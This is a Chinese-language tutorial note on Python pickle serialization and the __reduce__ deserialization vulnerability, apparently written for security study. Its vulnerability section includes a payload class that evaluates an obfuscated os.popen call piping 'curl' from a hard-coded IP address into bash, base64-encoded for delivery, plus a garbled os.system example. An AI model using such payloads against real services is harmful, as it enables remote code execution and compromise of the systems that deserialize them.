## 简介
Pickel 是一个模块，提供了一个简单的持久化功能，可以将对象以文件的形式存放在磁盘上。pickel 模块只能在 python 中使用，python 中几乎所有的数据类型（列表，字典，集合，类等等）都可以用 pickel 来反序列化。

也就是说，我们的 Pickel 提供了一个简单的序列化与反序列化问题。比如，我们可以通过我们的 `dump` 来吧我们的文件写入到我们的文件对象当中，`dumps` 时产生一个文件

同时，我们也可以通过我们的 `loads` 把我们的文件中的数据解析为一个 python 对象。`load` 读取文件。

```
import pickle

a_list=['a','b','c']

print(pickle.dumps(a_list))

c=b'\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x01a\x94\x8c\x01b\x94\x8c\x01c\x94e.'

print(pickle.loads(c))
```

![[Pasted image 20240424104327.png]]

为什么我们生成的字节那么扭曲？原因在于：我们的 `PVM`,PVM 是我们的 python 的一个“虚拟机当中”，也可以理解为我们的解释器。我们的 python 解释器会将编译后的字节码转发到我们的 Python 虚拟机中执行。

而我们的 Pickel 是一门基于**栈**的编程语言，其本质就是一个轻量级的 PVM，

## 漏洞
Pickle 反序列化漏洞源自于__reduce__函数，
**正常情况下**, 我们可以通过重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行。具体而言，python 要求 `object.__reduce__()` 返回一个元组，当 `__reduce__` 方法返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。

例如：
```
有OS类的payload
import pickle

import os

class A(object):

    def __reduce__(self):

        a='whoami'

        return (（os.system）,(参数1,))

a=A()

test=pickle.dumps(a)

pickle.loads(test)
```

```
import pickle
import base64

class A(object):
    def __reduce__(self):
        return (eval, ("__import__('o'+'s').popen('curl 148.135.82.190/2 | bash').read()",))    
a = A()
a = pickle.dumps(a)
print(base64.b64encode(a))

```

通过修改我们的 a，我们就可以实现任意指令执行。